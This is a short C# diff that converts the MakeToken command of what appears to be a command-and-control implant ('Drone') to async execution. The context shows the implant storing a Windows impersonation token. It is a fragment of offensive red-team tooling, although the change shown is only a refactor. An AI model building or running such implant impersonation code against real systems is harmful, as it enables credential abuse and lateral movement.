@@ -2,6 +2,7 @@
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Drone.Commands;
 
@@ -13,7 +14,7 @@ public sealed class MakeToken : DroneCommand
     public override byte Command => 0x2A;
     public override bool Threaded => false;
 
-    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         var split = task.Arguments[0].Split('\\');
 
@@ -36,6 +37,6 @@ public sealed class MakeToken : DroneCommand
         }
 
         Drone.ImpersonationToken = hToken;
-        Drone.SendTaskComplete(task.Id);
+        await Drone.SendTaskComplete(task.Id);
     }
 }
